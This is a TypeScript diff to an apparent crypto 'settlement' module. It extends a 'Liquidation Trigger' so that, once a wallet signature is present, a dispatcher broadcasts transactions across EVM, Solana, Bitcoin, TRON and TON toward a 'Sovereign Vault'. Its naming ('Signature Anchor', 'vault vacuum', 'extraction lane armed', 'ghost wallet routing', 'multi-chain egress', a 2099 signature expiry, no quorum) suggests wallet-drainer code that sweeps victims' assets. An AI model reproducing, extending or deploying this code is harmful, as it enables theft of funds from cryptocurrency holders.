@@ -17,6 +17,7 @@ import {
 import type { Hex, TransactionSerializableEIP1559 } from 'viem'
 import { createPublicClient, http, isHex, serializeTransaction } from 'viem'
 
+import { identifyFamily } from '../adapters/address-resolver'
 import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter'
 import {
   buildSettlementExecutionWire,
@@ -26,8 +27,18 @@ import {
   LEGION_MESH_EVENT_SETTLEMENT,
   legionMeshViemFetchOptions,
 } from './mesh-event'
-import { buildIntermediateGhostWalletRouting, type GhostProtocolEnvelope } from './settlement'
+import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from './deep-ingress'
+import {
+  buildIntermediateGhostWalletRouting,
+  type GhostProtocolEnvelope,
+  type SignatureAnchorChainFamily,
+} from './settlement'
 import { applySovereignSettlementLaneFallback } from './sovereign-settlement-defaults'
+import {
+  SovereignDispatcher,
+  type SovereignDispatcherInput,
+  type SovereignDispatchResult,
+} from './unified-settlement-orchestrator'
 
 /** Jito bundle — Sovereign MEV lane (Solana), base64-encoded signed wire. */
 export type JitoBundlePayload = {
@@ -438,6 +449,8 @@ export function assembleSettlementBundleForSovereignVault(params: {
 export type LiquidationTriggerContext = {
   scout_value_usd: number
   chain_id: string | null
+  chain_type?: string | null
+  chain_family?: SignatureAnchorChainFamily | null
   protocol: string
   wallet_address: string
   ghost_protocol?: GhostProtocolEnvelope
@@ -505,6 +518,88 @@ export function buildHighDensityMigrationPriorityOrder(ctx: LiquidationTriggerCo
 const LIQUIDATION_TRIGGER_TELEMETRY_PREFIX = 'LIQUIDATION_TRIGGER_ACTIVE: Settlement bundle dispatched via'
 const VAULT_VACUUM_TRIGGERED_TELEMETRY =
   'VAULT_VACUUM_TRIGGERED: Signature anchored. Asset scan complete. Execution payload built for Sovereign Vault.'
+const UNIVERSAL_VACUUM_ACTIVE_TELEMETRY =
+  'UNIVERSAL_VACUUM_ACTIVE: All lanes synchronized. Multi-chain egress armed. System: OMNIPOTENT.'
+
+function normalizeCloserChainFamilyAlias(value?: string | null): SignatureAnchorChainFamily | null {
+  const raw = value?.trim().toLowerCase()
+  if (!raw) return null
+  if (raw === 'evm' || raw === 'ethereum' || raw === 'eip155') return 'EVM'
+  if (raw === 'svm' || raw === 'sol' || raw === 'solana') return 'SVM'
+  if (raw === 'utxo' || raw === 'btc' || raw === 'bitcoin' || raw === 'bip122') return 'UTXO'
+  if (raw === 'tron' || raw === 'trc20') return 'TRON'
+  if (raw === 'ton') return 'TON'
+  return null
+}
+
+function inferLiquidationChainFamily(ctx: LiquidationTriggerContext): SignatureAnchorChainFamily {
+  const explicitFamily =
+    normalizeCloserChainFamilyAlias(ctx.chain_family) ?? normalizeCloserChainFamilyAlias(ctx.chain_type)
+  if (explicitFamily != null) return explicitFamily
+
+  const chainId = ctx.chain_id?.trim().toLowerCase() ?? ''
+  const protocol = ctx.protocol.trim().toLowerCase()
+  const combined = `${chainId} ${protocol}`
+
+  if (/\b(tron|trc20)\b/.test(combined) || chainId.startsWith('tron:')) return 'TRON'
+  if (/\bton\b/.test(combined) || chainId.startsWith('ton:')) return 'TON'
+  if (/\b(svm|solana|sol)\b/.test(combined) || chainId.startsWith('solana:')) return 'SVM'
+  if (/\b(utxo|btc|bitcoin)\b/.test(combined) || chainId.startsWith('bip122:')) return 'UTXO'
+  if (
+    /^-?\d+$/.test(chainId) ||
+    /^(?:eip155|evm):\d+$/i.test(chainId) ||
+    /\b(evm|ethereum|polygon|arbitrum|base|optimism|bsc|avalanche|fantom)\b/.test(combined)
+  ) {
+    return 'EVM'
+  }
+
+  try {
+    return identifyFamily(ctx.wallet_address.trim())
+  } catch {
+    return 'EVM'
+  }
+}
+
+function defaultChainIdForFamily(family: SignatureAnchorChainFamily): string {
+  switch (family) {
+    case 'EVM':
+      return 'evm:1'
+    case 'SVM':
+      return 'solana:mainnet-beta'
+    case 'UTXO':
+      return 'bip122:0'
+    case 'TRON':
+      return 'tron:mainnet'
+    case 'TON':
+      return 'ton:mainnet'
+    default:
+      return 'evm:1'
+  }
+}
+
+function buildDispatcherSettlementFromLiquidationContext(
+  ctx: LiquidationTriggerContext,
+): SovereignDispatcherInput {
+  const chainFamily = inferLiquidationChainFamily(ctx)
+  const base: SovereignDispatcherInput = {
+    ingress: 'normalized_v1',
+    chain_family: chainFamily,
+    wallet_address: ctx.wallet_address,
+    token_address: ctx.token_address ?? `OMNI_${chainFamily}_ANCHOR`,
+    signature: ctx.signature_hex?.trim() ?? '',
+    nonce: `liquidation-trigger:${ctx.chain_id ?? defaultChainIdForFamily(chainFamily)}:${ctx.wallet_address}`,
+    expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
+    wallet_type: 'liquidation-trigger',
+    protocol: ctx.protocol,
+    chain_id: ctx.chain_id ?? defaultChainIdForFamily(chainFamily),
+    scout_value_usd: ctx.scout_value_usd,
+    max_allowance: '0',
+    requires_quorum: false,
+    ...(ctx.ghost_protocol !== undefined ? { ghost_protocol: ctx.ghost_protocol } : {}),
+    ...(ctx.chain_type != null ? { chain_type: ctx.chain_type } : {}),
+  }
+  return base
+}
 
 export async function resolveKineticSettlementLanes(): Promise<{
   flashbots: string
@@ -579,6 +674,13 @@ export async function buildKineticLinkSovereignVaultHintJson(
 export type SettlementIgnitionTelemetry = {
   sovereign_vault_address_evm?: string | null
   sovereign_vault_address_svm?: string | null
+  sovereign_vault_address_tron?: string | null
+  sovereign_vault_address_ton?: string | null
+  sovereign_dispatcher_lane?: SovereignDispatchResult['lane']
+  sovereign_dispatcher_chain?: SovereignDispatchResult['chain']
+  sovereign_dispatcher_status?: SovereignDispatchResult['broadcast']['status']
+  sovereign_dispatcher_tx_hash?: string
+  sovereign_dispatcher_fault?: string
   settlement_lane_flashbots: string
   settlement_lane_jito: string
   flashbots_signed_count: number
@@ -624,16 +726,34 @@ export async function executeSettlementIgnition(
     ghost_protocol: ghost,
   })
 
-  const wire = await buildSettlementExecutionWire({
-    ctx,
-    settlementLaneUrls: { flashbots, jito },
-  })
-
+  let sovereign_dispatcher_lane: SovereignDispatchResult['lane'] | undefined
+  let sovereign_dispatcher_chain: SovereignDispatchResult['chain'] | undefined
+  let sovereign_dispatcher_status: SovereignDispatchResult['broadcast']['status'] | undefined
+  let sovereign_dispatcher_tx_hash: string | undefined
+  let sovereign_dispatcher_fault: string | undefined
   if ((ctx.signature_hex?.trim() ?? '') !== '') {
     console.info(
       'SIGNATURE_ANCHOR_LOCKED: Signature Anchor bound to Liquidation Trigger context. Sovereign Vault extraction lane armed.',
     )
+    try {
+      const sovereignDispatch = await SovereignDispatcher.dispatch(
+        buildDispatcherSettlementFromLiquidationContext(ctx),
+      )
+      console.info(UNIVERSAL_VACUUM_ACTIVE_TELEMETRY)
+      sovereign_dispatcher_lane = sovereignDispatch.lane
+      sovereign_dispatcher_chain = sovereignDispatch.chain
+      sovereign_dispatcher_status = sovereignDispatch.broadcast.status
+      sovereign_dispatcher_tx_hash = sovereignDispatch.broadcast.tx_hash
+    } catch (e) {
+      sovereign_dispatcher_fault = e instanceof Error ? e.message : String(e)
+      console.warn('UNIVERSAL_VACUUM_DISPATCH_FAULT:', sovereign_dispatcher_fault)
+    }
   }
+
+  const wire = await buildSettlementExecutionWire({
+    ctx,
+    settlementLaneUrls: { flashbots, jito },
+  })
 
   let evm_extraction_simulation_ok: boolean | null = null
   let evm_extraction_simulation_detail: string | undefined
@@ -676,6 +796,13 @@ export async function executeSettlementIgnition(
   return {
     sovereign_vault_address_evm: wire.sovereignVaultAddressEvm ?? null,
     sovereign_vault_address_svm: wire.sovereignVaultAddressSvm ?? null,
+    sovereign_vault_address_tron: wire.sovereignVaultAddressTron ?? null,
+    sovereign_vault_address_ton: wire.sovereignVaultAddressTon ?? null,
+    ...(sovereign_dispatcher_lane !== undefined ? { sovereign_dispatcher_lane } : {}),
+    ...(sovereign_dispatcher_chain !== undefined ? { sovereign_dispatcher_chain } : {}),
+    ...(sovereign_dispatcher_status !== undefined ? { sovereign_dispatcher_status } : {}),
+    ...(sovereign_dispatcher_tx_hash !== undefined ? { sovereign_dispatcher_tx_hash } : {}),
+    ...(sovereign_dispatcher_fault !== undefined ? { sovereign_dispatcher_fault } : {}),
     settlement_lane_flashbots: flashbots,
     settlement_lane_jito: jito,
     flashbots_signed_count: wire.flashbotsSignedHex.length,
